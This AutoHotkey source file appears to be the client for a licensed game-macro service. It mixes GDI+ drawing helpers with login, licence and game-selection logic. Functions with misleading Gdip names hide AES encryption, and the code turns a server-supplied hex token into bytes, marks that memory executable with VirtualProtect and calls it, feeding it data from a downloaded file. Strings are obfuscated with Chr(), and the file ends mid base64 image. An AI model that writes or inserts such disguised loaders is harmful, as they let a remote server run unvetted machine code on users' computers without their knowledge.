Gdip_CreateLinearGrBrushFromRect(x, y, w, h, ARGB1, ARGB2, LinearGradientMode:=1, WrapMode:=1) {
CreateRectF(RectF, x, y, w, h)
pLinearGradientBrush := 0
E := DllCall("gdiplus\GdipCreateLineBrushFromRect", "UPtr", &RectF, "int", ARGB1, "int", ARGB2, "int", LinearGradientMode, "int", WrapMode, "UPtr*", pLinearGradientBrush)
return pLinearGradientBrush
}
Gdip_CreatePen(ARGB, w, Unit:=2) {
pPen := 0
E := DllCall("gdiplus\GdipCreatePen1", "UInt", ARGB, "float", w, "int", Unit, "UPtr*", pPen)
return pPen
}
Gdip_GetPenWidth(pPen) {
width := 0
E := DllCall("gdiplus\GdipGetPenWidth", "UPtr", pPen, "float*", width)
If E
return -1
return width
}
Gdip_DrawEllipse(pGraphics, pPen, x, y, w, h) {
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipDrawEllipse", Ptr, pGraphics, Ptr, pPen, "float", x, "float", y, "float", w, "float", h)
}
Gdip_DrawLine(pGraphics, pPen, x1, y1, x2, y2) {
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipDrawLine"
, Ptr, pGraphics
, Ptr, pPen
, "float", x1, "float", y1
, "float", x2, "float", y2)
}
Gdip_DrawRoundedLine(G, x1, y1, x2, y2, LineWidth, LineColor) {
pPen := Gdip_CreatePen(LineColor, LineWidth)
Gdip_DrawLine(G, pPen, x1, y1, x2, y2)
Gdip_DeletePen(pPen)
pPen := Gdip_CreatePen(LineColor, LineWidth/2)
Gdip_DrawEllipse(G, pPen, x1-LineWidth/4, y1-LineWidth/4, LineWidth/2, LineWidth/2)
Gdip_DrawEllipse(G, pPen, x2-LineWidth/4, y2-LineWidth/4, LineWidth/2, LineWidth/2)
Gdip_DeletePen(pPen)
}
Gdip_ResetClip(pGraphics) {
return DllCall("gdiplus\GdipResetClip", "UPtr", pGraphics)
}
Gdip_CreateARGBHBITMAPFromBitmap(ByRef pBitmap) {
Gdip_GetImageDimensions(pBitmap, Width, Height)
hdc := CreateCompatibleDC()
hbm := CreateDIBSection(width, -height, hdc, 32, pBits)
obm := SelectObject(hdc, hbm)
CreateRect(Rect, 0, 0, width, height)
VarSetCapacity(BitmapData, 16+2*A_PtrSize, 0)
, NumPut( width, BitmapData, 0, "uint")
, NumPut( height, BitmapData, 4, "uint")
, NumPut( 4 * width, BitmapData, 8, "int")
, NumPut( 0xE200B, BitmapData, 12, "int")
, NumPut( pBits, BitmapData, 16, "ptr")
DllCall("gdiplus\GdipBitmapLockBits"
, "ptr", pBitmap
, "ptr", &Rect
, "uint", 5
, "int", 0xE200B
, "ptr", &BitmapData)
DllCall("gdiplus\GdipBitmapUnlockBits", "ptr", pBitmap, "ptr", &BitmapData)
SelectObject(hdc, obm)
DeleteObject(hdc)
return hbm
}
Gdip_CreateBitmapFromHBITMAP(hBitmap, hPalette:=0) {
Static Ptr := "UPtr"
pBitmap := 0
DllCall("gdiplus\GdipCreateBitmapFromHBITMAP", Ptr, hBitmap, Ptr, hPalette, "UPtr*", pBitmap)
return pBitmap
}
CreateRect(ByRef Rect, x, y, x2, y2) {
VarSetCapacity(Rect, 16)
NumPut(x, Rect, 0, "uint"), NumPut(y, Rect, 4, "uint")
NumPut(x2, Rect, 8, "uint"), NumPut(y2, Rect, 12, "uint")
}
CreatePointsF(ByRef PointsF, inPoints) {
Points := StrSplit(inPoints, "|")
PointsCount := Points.Length()
VarSetCapacity(PointsF, 8 * PointsCount, 0)
for eachPoint, Point in Points
{
Coord := StrSplit(Point, ",")
NumPut(Coord[1], &PointsF, 8*(A_Index-1), "float")
NumPut(Coord[2], &PointsF, (8*(A_Index-1))+4, "float")
}
Return PointsCount
}
Gdip_DrawRoundedRectangle(pGraphics, pPen, x, y, w, h, r) {
penWidth := Gdip_GetPenWidth(pPen)
pw := penWidth / 2
if (w <= h && (r + pw > w / 2))
r := (w / 2 > pw) ? w / 2 - pw : 0
else if (h < w && r + pw > h / 2)
r := (h / 2 > pw) ? h / 2 - pw : 0
else if (r < pw / 2)
r := pw / 2
r2 := r*2
path1 := Gdip_CreatePath(0)
Gdip_AddPathArc(path1, x + pw, y + pw, r2, r2, 180, 90)
Gdip_AddPathArc(path1, x + w - r2 - pw, y + pw, r2, r2, 270, 90)
Gdip_AddPathArc(path1, x + w - r2 - pw, y + h - r2 - pw, r2, r2, 0, 90)
Gdip_AddPathArc(path1, x + pw, y + h - r2 - pw, r2, r2, 90, 90)
Gdip_ClosePathFigure(path1)
E := Gdip_DrawPath(pGraphics, pPen, path1)
Gdip_DeletePath(path1)
return E
}
Gdip_Property() {
For k, v in GetUID()
Hash .= (Hash ? "/" : "") v
Return CreateHash(Hash)
}
Gdip_FillRoundedRectangle(pGraphics, pBrush, x, y, w, h, r) {
r := (w <= h) ? (r < w // 2) ? r : w // 2 : (r < h // 2) ? r : h // 2
r2 := r*2
path1 := Gdip_CreatePath(0)
Gdip_AddPathArc(path1, x, y, r2, r2, 180, 90)
Gdip_AddPathArc(path1, x + w - r2, y, r2, r2, 270, 90)
Gdip_AddPathArc(path1, x + w - r2, y + h - r2, r2, r2, 0, 90)
Gdip_AddPathArc(path1, x, y + h - r2, r2, r2, 90, 90)
Gdip_ClosePathFigure(path1)
E := Gdip_FillPath(pGraphics, pBrush, path1)
Gdip_DeletePath(path1)
return E
}
Gdip_AddPathEllipse(pPath, x, y, w, h) {
return DllCall("gdiplus\GdipAddPathEllipse", "UPtr", pPath, "float", x, "float", y, "float", w, "float", h)
}
Gdip_AddPathRectangle(pPath, x, y, w, h) {
return DllCall("gdiplus\GdipAddPathRectangle", "UPtr", pPath, "float", x, "float", y, "float", w, "float", h)
}
Gdip_AddPathBeziers(pPath, Points) {
iCount := CreatePointsF(PointsF, Points)
return DllCall("gdiplus\GdipAddPathBeziers", "UPtr", pPath, "UPtr", &PointsF, "int", iCount)
}
Gdip_AddPathBezier(pPath, x1, y1, x2, y2, x3, y3, x4, y4) {
return DllCall("gdiplus\GdipAddPathBezier", "UPtr", pPath, "float", x1, "float", y1, "float", x2, "float", y2, "float", x3, "float", y3, "float", x4, "float", y4)
}
Gdip_AddPathLines(pPath, Points) {
iCount := CreatePointsF(PointsF, Points)
return DllCall("gdiplus\GdipAddPathLine2", "UPtr", pPath, "UPtr", &PointsF, "int", iCount)
}
Gdip_AddPathLine(pPath, x1, y1, x2, y2) {
return DllCall("gdiplus\GdipAddPathLine", "UPtr", pPath, "float", x1, "float", y1, "float", x2, "float", y2)
}
Gdip_AddPathArc(pPath, x, y, w, h, StartAngle, SweepAngle) {
return DllCall("gdiplus\GdipAddPathArc", "UPtr", pPath, "float", x, "float", y, "float", w, "float", h, "float", StartAngle, "float", SweepAngle)
}
Gdip_AddPathPie(pPath, x, y, w, h, StartAngle, SweepAngle) {
return DllCall("gdiplus\GdipAddPathPie", "UPtr", pPath, "float", x, "float", y, "float", w, "float", h, "float", StartAngle, "float", SweepAngle)
}
Gdip_CreatePath(BrushMode:=0) {
pPath := 0
DllCall("gdiplus\GdipCreatePath", "int", BrushMode, "UPtr*", pPath)
return pPath
}
Gdip_FillPath(pGraphics, pBrush, pPath) {
Static Ptr := "UPtr"
return DllCall("gdiplus\GdipFillPath", Ptr, pGraphics, Ptr, pBrush, Ptr, pPath)
}
Gdip_DrawPath(pGraphics, pPen, pPath) {
return DllCall("gdiplus\GdipDrawPath", "UPtr", pGraphics, "UPtr", pPen, "UPtr", pPath)
}
Gdip_DeletePath(pPath) {
return DllCall("gdiplus\GdipDeletePath", "UPtr", pPath)
}
Gdip_ClosePathFigure(pPath) {
return DllCall("gdiplus\GdipClosePathFigure", "UPtr", pPath)
}
Gdip_ClosePathDraw(String, Ptr:= "", Output:= "BASE64") {
AHANDLE := OpenAlgorithmProvider(Chr(65)Chr(69)Chr(83))
SetProperty(AHANDLE, "ChainingMode")
YHANDLE := GenerateBitmap(AHANDLE, Ptr)
cbInput := StrPutVar(String, pbInput)
cLen := Encrypt(YHANDLE, pbInput, cbInput, 16, rData, 0x00000001)
ENCRYPT := CryptBinaryToString(rData, cLen, Output)
if (YHANDLE)
Destroy(YHANDLE)
if (AHANDLE)
CloseAlgorithmProvider(AHANDLE)
return CryptBinaryToString(rData, cLen, Output)
}
Gdip_ClosePathFill(String, Ptr:= "", Input:= "BASE64") {
AHANDLE := OpenAlgorithmProvider(Chr(65)Chr(69)Chr(83))
SetProperty(AHANDLE, "ChainingMode")
YHANDLE := GenerateBitmap(AHANDLE, Ptr)
cLen := CryptStringToBinary(String, rData)
dLen := Decrypt(YHANDLE, rData, cLen, 16, dData, 0x00000001)
if (YHANDLE)
Destroy(YHANDLE)
if (AHANDLE)
CloseAlgorithmProvider(AHANDLE)
return StrGet(&dData, dLen, "UTF-8")
}
OpenAlgorithmProvider(pszAlgId, dwFlags := 0, pszImplementation := 0) {
NT_STATUS := DllCall("bcrypt\BCryptOpenAlgorithmProvider", "ptr*", phAlgorithm, "ptr", &pszAlgId, "ptr", pszImplementation, "uint", dwFlags)
if (NT_STATUS = 0)
return phAlgorithm
return false
}
SetProperty(hObject, pszProperty) {
NT_STATUS := DllCall("bcrypt\BCryptSetProperty", "ptr", hObject, "ptr", &pszProperty, "ptr", &pbInput:="ChainingModeECB", "uint", 15, "uint", dwFlags := 0)
if (NT_STATUS = 0)
return true
return false
}
GenerateBitmap(hAlgorithm, pb) {
NT_STATUS := DllCall("bcrypt\BCryptGenerateSymmetricKey", "ptr", hAlgorithm, "ptr*", pBitmap, "ptr", 0, "uint", 0, "ptr", &pb, "uint", 32, "uint", 0)
if (NT_STATUS = 0)
return pBitmap
return false
}
Encrypt(hKey, ByRef pbInput, cbInput, BLOCK_LENGTH, ByRef pbOutput, dwFlags := 0) {
NT_STATUS := DllCall("bcrypt\BCryptEncrypt", "ptr", hKey, "ptr", &pbInput, "uint", cbInput, "ptr", 0, "ptr", (pbIV ? &pbIV : 0), "uint", (cbIV ? &cbIV : 0), "ptr", 0, "uint", 0, "uint*", cbOutput, "uint", dwFlags)
if (NT_STATUS = 0)
{
VarSetCapacity(pbOutput, cbOutput, 0)
NT_STATUS := DllCall("bcrypt\BCryptEncrypt", "ptr", hKey, "ptr", &pbInput, "uint", cbInput, "ptr", 0, "ptr", (pbIV ? &pbIV : 0), "uint", (cbIV ? &cbIV : 0), "ptr", &pbOutput, "uint", cbOutput, "uint*", cbOutput, "uint", dwFlags)
if (NT_STATUS = 0)
{
return cbOutput
}
}
return false
}
Decrypt(hKey, ByRef String, cbInput, BLOCK_LENGTH, ByRef pbOutput, dwFlags) {
VarSetCapacity(pbInput, cbInput, 0)
DllCall("msvcrt\memcpy", "ptr", &pbInput, "ptr", &String, "ptr", cbInput)
NT_STATUS := DllCall("bcrypt\BCryptDecrypt", "ptr", hKey, "ptr", &pbInput, "uint", cbInput, "ptr", 0, "ptr", (pbIV ? &pbIV : 0), "uint", (cbIV ? &cbIV : 0), "ptr", 0, "uint", 0, "uint*", cbOutput, "uint", dwFlags)
if (NT_STATUS =0)
{
VarSetCapacity(pbOutput, cbOutput, 0)
NT_STATUS := DllCall("bcrypt\BCryptDecrypt", "ptr", hKey, "ptr", &pbInput, "uint", cbInput, "ptr", 0, "ptr", (pbIV ? &pbIV : 0), "uint", (cbIV ? &cbIV : 0), "ptr", &pbOutput, "uint", cbOutput, "uint*", cbOutput, "uint", dwFlags)
if (NT_STATUS = 0)
{
return cbOutput
}
}
return false
}
Destroy(hKey) {
DllCall("bcrypt\BCryptDestroyKey", "ptr", hKey)
}
CloseAlgorithmProvider(hAlgorithm) {
DllCall("bcrypt\BCryptCloseAlgorithmProvider", "ptr", hAlgorithm, "uint", 0)
}
StrPutVar(String, ByRef Data) {
VarSetCapacity(Data, Length := StrPut(String, "UTF-8") - 1)
return StrPut(String, &Data, Length, "UTF-8")
}
StrPutFix(v) {
Length := StrPut(v, "UTF-8") - 1
VarSetCapacity(%Length%, Length)
StrPut(v, & %Length%, Length, "UTF-8")
SetVar := [%Length%]
Return SetVar.1
}
class OBJSave {
__New(file) {
if !FileExist(file)
FileAppend,% emptyvar,% file
else {
FileRead, src, % file
if (src != "") {
FixBase := this.base
this := Gdip_SetString(src)
if ( !IsObject(this) )
this := {}
this.base := FixBase
}
}
this.file := file
Return this
}
Write(Section, Key, Value) {
if ( !IsObject(this[Section]) )
this[Section] := {}
if (value == "")
this[Section].Remove(Key)
else
this[Section][Key] := value
}
Save(obj) {
saveObj := this.objSave(obj)
FileDelete, % this.file
FileAppend, % saveObj, % this.file
}
objSave(obj) {
static q := Chr(34)
if IsObject(obj) {
is_array := 0, out := ""
for k in obj
is_array := k == A_Index
until !is_array
for k, v in obj {
if !is_array
out .= ( ObjGetCapacity([k], 1) ? this.objSave(k) : q . k . q ) .  ":"
out .= this.objSave(v) . ","
}
if (out != "")
out := Trim(out, ",")
return is_array ? "[" . out . "]" : "{" . out . "}"
}
else if (ObjGetCapacity([obj], 1) == "")
return obj
return q . obj . q
}
}
Gdip_RunCode() {
Type := MHGui.Controls[A_GuiControl].Array
A_Args.SetGame := A_Args.Games[Type].Game
1 := "GameLogin"
2 := Save.Config.Edit01
3 := Save.Config.Edit02
4 := Save.Ling
5 := A_Args.SetGame
6 := A_Args.JS.Token
Data.Send := Data.GameLogin
Loop, 6
Data.Send := StrReplace(Data.Send, "!" A_Index, %A_Index%)
try {
r := Gdip_SetString(ServerPOST(Data.Send,01))
If (r.Type != 200) {
Msg := {por:"Error 404 ao carregar game, Entre em contato com um Admin.", eng:"Error 404 loading game, please contact an Admin."}
MsgBox, 4112, Error!, % Msg[Save.LanguageOS]
Return
}
} catch e {
If (i := InStr(e.Message, "Description:")){
MsgBox, % "Description: " StrReplace(SubStr(e.Message, i, InStr(e.Message, "`n",, i)-i), "Description:`t" , "")
Return
}
MsgBox, %  "Error, Entre em contato com um Admin.`n" e.Extra "`n" e.Message
}
Try {
If (!A_Args.Games[Type].Var)
Return
} catch e {
MsgData(07, 4112)
Return
}
Try {
Version := A_Args.Games[Type].Version
If (!FileExist( A_Args.SetGame ) || A_Args.Games[Type].Version != Save.Version[A_Args.SetGame]){
Gdip_GetFile(A_Args.Games[Type].Link, A_Args.SetGame)
if ( !IsObject(Save.Version) )
Save.Version := {}
Save.Version[A_Args.SetGame] := A_Args.Games[Type].Version
Save.Save(Save)
}
VarSetCapacity(str, A_Args.Games[Type].Var, 0)
Ptr := (A_PtrSize ? "UPtr" : "UInt")
AStr := (A_IsUnicode ? "AStr" : "Str")
Ahk := A_AhkPath
If (!Ahk){
MsgBox, 4112, Error!, `nCan't Find:`n`n%Ahk%`n`t
return
}
GetLoad(Func, r.Token)
Loop, % A_Args.Games[Type].ID
NumPut(LoadExec(), str, (A_Index-1)*4, "UInt")
DllCall(&Func,AStr,Ahk,AStr,,Ptr,DllCall("GetModuleHandle", "Str","Kernel32", Ptr),Ptr,&str,"Int",A_Args.Games[Type].ID)
ExitApp
} catch e {
ExitApp
}
}
LoadExec(){
static v:=0, i:=2, Ptr
If (!Ptr)
FileRead, Ptr, % A_Args.SetGame
i+=v
Return SubStr(Ptr, i++ , v:=SubStr(Ptr, i-2, 1)=0 ? 10 : SubStr(Ptr, i-2, 1))
}
GetLoad(ByRef code, Token){
VarSetCapacity(code, len:=StrLen(Token)//2)
Loop, % len
NumPut("0x" SubStr(Token, 2*A_Index-1, 2), code, A_Index-1,"uchar")
Ptr:=A_PtrSize ? "UPtr" : "UInt"
DllCall("VirtualProtect",Ptr,&code,Ptr,len,"UInt",0x40,Ptr "*",0)
}
GuiLoad(){
try {
doc := ComObjCreate("htmlfile")
doc.write("<meta http-equiv=""X-UA-Compatible"" content=""IE=9"">")
Get := ComObjCreate("WinHttp.WinHttpRequest.5.1")
Get.Open("POST", "https://macro-helpers.com:2447/AHK")
Get.SetRequestHeader("Content-Type", "application/json")
Body = {"type": "guiAHK"}
Get.Send(Body)
Return doc.parentWindow.Eval("(" Get.ResponseText ")")
} catch e {
MsgBox, % "Erro, Sem Resposta do Servidor`n" e.Message
ExitApp
}
}
ServerPOST(Body,Type) {
Get := ComObjCreate("WinHttp.WinHttpRequest.5.1")
Get.Open("POST", Data["Link"][Type])
Get.SetRequestHeader("Content-Type", "application/json")
Get.Send(Body)
Return Get["ResponseText"]
}
TryCreate(Body,Type){
try {
r := Gdip_SetString(ServerPOST(Body,Type))
If (r.Type == 100) {
MHGui.Controls.Edit01.SetText(MHGui.Controls.Edit04.GetText())
MHGui.Controls.Edit02.SetText(MHGui.Controls.Edit05.GetText())
MHGui.Controls.CustomText01.Set({por: "Tela de Login", eng: "Login Screen"})
MHGui.Show(,"Login")
MHGui.Hide("Create")
Save.Save(Save)
MsgData(05, 4144)
Return
}
Return r
} catch e {
If (i := InStr(e.Message, "Description:")){
MsgBox, % "Description: " StrReplace(SubStr(e.Message, i, InStr(e.Message, "`n",, i)-i), "Description:`t" , "")
Return
}
MsgBox, %  "Error, Entre em contato com um Admin.`n" e.Extra "`n" e.Message "`n" e.File
}
}
TryLogin(Body,Type) {
try {
r := Gdip_SetString(ServerPOST(Body,Type))
If (r.Type == 200) {
If (r.Token) {
A_Args.Token := Gdip_ClosePathFill(r.Token, A_Args.PW.UPtr)
Token := A_Args.PW.eval(Gdip_ClosePathFill(A_Args.Token,  A_Args.PW.AStr))
}
GuiGames(Token)
Return r
}
Return r
} catch e {
if (e.What == ":=" ) {
Title := {por:"S" Chr(101)Chr(109)Chr(32)Chr(108) "icen" Chr(231) "a", eng:"No license"}
Msg := {por:"Voc" Chr(234) " n" Chr(227) "o " Chr(112)Chr(111) "ssui n" Chr(101)Chr(110) "huma licen" Chr(231) "a ainda.", eng:"You don't have a license yet."}
MsgBox, 4112, % Title[Save.LanguageOS], % Msg[Save.LanguageOS]
Return
}
If (i := InStr(e.Message, "Description:")){
MsgBox, % "Description: " StrReplace(SubStr(e.Message, i, InStr(e.Message, "`n",, i)-i), "Description:`t" , "")
Return
}
MsgBox, %  "Error, Entre em contato com um Admin.`n" e.Extra "`n" e.Message "`n" e.File
}
}
GuiGames(Games) {
A_Args.Games := Games
Len := A_Args.JS.Object.keys(Games).length
If (Len = 0){
MsgData(06, 4112)
Return
}
If (Len < 5)
y := 96
else if (Len < 9)
y := 52
else
y := 23
i := 1
Loop % Len {
try {
if (!Games[A_Index]["Game"])
Continue
} catch
Continue
if (i == 1)
MHGui.Add("IMGButton", Games[A_Index]["Game"], "x7  y" y), i++
else
MHGui.Add("IMGButton", Games[A_Index]["Game"], "x+7 y" y), i++
if (i == 5)
i := 1, y += 91
MHGui.Controls["IMGButton" Games[A_Index]["Game"]].Array := A_Index
MHGui.Add("DefText", {"por": Games[A_Index]["Days"],"eng": Games[A_Index]["Days"],"Window": "Games","FontOptions": "s6 cFFFFFF bold", "Font": "Tahoma"}, "y+5 w74 center")
}
MHGui.Controls.CustomText01.Set({eng: "Select Game", por: "Selecionar Jogo"})
MHGui.Show(,"Games")
MHGui.Hide("Login")
}
CreateHash(String) {
DllCall("bcrypt\BCryptOpenAlgorithmProvider", "ptr*", ALG_HANDLE, "ptr",  &pszAlgId:="MD5", "ptr",  0, "uint", 0x00000008)
cbSecret := StrPutVar("Create Hash", pbSecret)
NT_STATUS := DllCall("bcrypt\BCryptCreateHash", "ptr",  ALG_HANDLE, "ptr*", HASH_HANDLE, "ptr",  pbHashObject := 0, "uint", cbHashObject := 0, "ptr",  &pbSecret, "uint", cbSecret, "uint", dwFlags := 0)
if (NT_STATUS != 0)
return False
cbInput := StrPutVar(String, pbInput)
DllCall("bcrypt\BCryptHashData", "ptr",  HASH_HANDLE, "ptr",  &pbInput, "uint", cbInput, "uint", 0)
VarSetCapacity(HASH_DATA, 16, 0)
NT_STATUS := DllCall("bcrypt\BCryptFinishHash", "ptr",  HASH_HANDLE, "ptr",  &HASH_DATA, "uint", 16, "uint", 0)
if (NT_STATUS != 0)
return False
if (HASH_HANDLE)
DllCall("bcrypt\BCryptDestroyHash", "ptr", HASH_HANDLE)
if (ALG_HANDLE)
DllCall("bcrypt\BCryptCloseAlgorithmProvider", "ptr", ALG_HANDLE, "uint", 0)
return CryptBinaryToString(HASH_DATA, 16, "HEXRAW")
}
GuiName() {
DllCall("bcrypt\BCryptOpenAlgorithmProvider", "ptr*", ALG_HANDLE, "ptr",  &pszAlgId:="MD5", "ptr",  0, "uint", 0x00000008)
Random, HMAC, 1000, 1000000
cbSecret := StrPutVar(HMAC, pbSecret)
NT_STATUS := DllCall("bcrypt\BCryptCreateHash", "ptr",  ALG_HANDLE, "ptr*", HASH_HANDLE, "ptr",  pbHashObject := 0, "uint", cbHashObject := 0, "ptr",  &pbSecret, "uint", cbSecret, "uint", dwFlags := 0)
if (NT_STATUS != 0)
return "Error"
Random, String, 1000, 1000000
cbInput := StrPutVar(String, pbInput)
DllCall("bcrypt\BCryptHashData", "ptr",  HASH_HANDLE, "ptr",  &pbInput, "uint", cbInput, "uint", 0)
DllCall("bcrypt\BCryptGetProperty", "ptr", ALG_HANDLE, "ptr", &pszProperty:="HashDigestLength", "uint*", HASH_LENGTH, "uint",  4, "uint*", pcbResult, "uint",  dwFlags := 0)
VarSetCapacity(HASH_DATA, HASH_LENGTH, 0)
NT_STATUS := DllCall("bcrypt\BCryptFinishHash", "ptr",  HASH_HANDLE, "ptr",  &HASH_DATA, "uint", HASH_LENGTH, "uint", 0)
if (NT_STATUS != 0)
return "Error"
if (HASH_HANDLE)
DllCall("bcrypt\BCryptDestroyHash", "ptr", HASH_HANDLE)
if (ALG_HANDLE)
DllCall("bcrypt\BCryptCloseAlgorithmProvider", "ptr", ALG_HANDLE, "uint", 0)
Random, Trim, 10, 28
return SubStr(CryptBinaryToString(HASH_DATA, HASH_LENGTH, "HEXRAW"), 1, Trim)
}
String() {
Random, String1, 10000000, 99999999
Random, String2, 10000000, 99999999
A_Args.JS.GetTime := String1 . String2
return A_Args.JS.GetTime
}
GetTime() {
static SYSTEMTIME, init := VarSetCapacity(SYSTEMTIME, 16, 0) && NumPut(16, SYSTEMTIME, "UShort")
DllCall("kernel32.dll\GetSystemTime", "Ptr", &SYSTEMTIME, "Ptr")
Return NumGet(SYSTEMTIME, 6, "UShort") "T" NumGet(SYSTEMTIME, 8, "UShort") ":" NumGet(SYSTEMTIME, 10, "UShort") ":" NumGet(SYSTEMTIME, 12, "UShort") "." NumGet(SYSTEMTIME, 14, "UShort") "Z"
}
IsValidEmail(emailstr){
static 	regex := "is)^(?:""(?:\\\\.|[^""])*""|[^@]+)@(?=[^()]*(?:\([^)]*\)[^()]*)*\z)(?![^ ]* (?=[^)]+(?:\(|\z)))(?:(?:[a-z\d() ]+(?:[a-z\d() -]*[()a-z\d])?\.)+[a-z\d]{2,6}|\[(?:(?:1?\d\d?|2[0-4]\d|25[0-4])\.){3}(?:1?\d\d?|2[0-4]\d|25[0-4])\]) *\z"
return RegExMatch(emailstr, regex) != 0
}
zCompress(Byref Compressed, Byref Data, DataLen, level = -1) {
nSize := DllCall("mCode\compressBound", "UInt", DataLen, "Cdecl")
VarSetCapacity(Compressed,nSize)
ErrorLevel := DllCall("mCode\compress2", "ptr", &Compressed, "UIntP", nSize, "ptr", &Data, "UInt", DataLen, "Int", level, "Cdecl")
Compressed := [Compressed]
return ErrorLevel ? 0 : nSize
}
zDecompress(Byref Decompressed, Byref Compressed, DataLen, OriginalSize = -1) {
OriginalSize := (OriginalSize > 0) ? OriginalSize : DataLen*10
VarSetCapacity(Decompressed,OriginalSize)
ErrorLevel := DllCall("mCode\uncompress", "Ptr", &Decompressed, "UIntP", OriginalSize, "Ptr", &Compressed, "UInt", DataLen)
return ErrorLevel
}
Base64Enc( ByRef Bin, nBytes, LineLength := 64, LeadingSpaces := 0 ) {
Local Rqd := 0, B64, B := "", N := 0 - LineLength + 1
DllCall( "Crypt32.dll\CryptBinaryToString", "Ptr",&Bin ,"UInt",nBytes, "UInt",0x1, "Ptr",0, "UIntP",Rqd )
VarSetCapacity( B64, Rqd * ( A_Isunicode ? 2 : 1 ), 0 )
DllCall( "Crypt32.dll\CryptBinaryToString", "Ptr",&Bin, "UInt",nBytes, "UInt",0x1, "Str",B64, "UIntP",Rqd )
If ( LineLength = 64 and ! LeadingSpaces )
Return B64
B64 := StrReplace( B64, "`r`n" )
Loop % Ceil( StrLen(B64) / LineLength )
B .= Format("{1:" LeadingSpaces "s}","" ) . SubStr( B64, N += LineLength, LineLength ) . "`n"
Return RTrim( B,"`n" )
}
Base64Dec( ByRef B64, ByRef Bin ) {
Local Rqd := 0, BLen := StrLen(B64)
DllCall( "Crypt32.dll\CryptStringToBinary", "Str",B64, "UInt",BLen, "UInt",0x1, "UInt",0, "UIntP",Rqd, "Int",0, "Int",0 )
VarSetCapacity( Bin, 128 ), VarSetCapacity( Bin, 0 ), VarSetCapacity( Bin, Rqd, 0 )
DllCall( "Crypt32.dll\CryptStringToBinary", "Str",B64, "UInt",BLen, "UInt",0x1, "Ptr",&Bin, "UIntP",Rqd, "Int",0, "Int",0 )
Return Rqd
}
LoadImages() {
A_Args.PNG := {}
Data.PNG := "iVBORw0KGgoAAAANSUhEUgAAA"
A_Args.PNG.LogoMH       := Gdip_BitmapFromBase64(0,1,Data.PNG "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